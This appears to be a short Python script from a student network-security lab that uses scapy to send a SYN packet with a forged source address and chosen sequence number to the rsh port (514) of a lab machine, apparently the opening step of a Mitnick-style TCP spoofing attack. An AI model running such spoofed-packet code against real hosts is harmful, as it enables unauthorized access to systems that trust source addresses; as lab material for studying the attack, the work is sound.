from scapy.all import *
import time
from random import randint
 
x_ip = "10.0.2.8"
x_port = 514
 
# srv_ip = "10.0.2.7" # Yaseen's machine
srv_ip = "10.0.2.15" # Alakbar's machine
srv_port = 1023
sequence = 778933536
print("Inital sequence number: " + str(sequence))

ip = IP(src=srv_ip, dst=x_ip)
tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=sequence)

pkt = ip/tcp
send(pkt)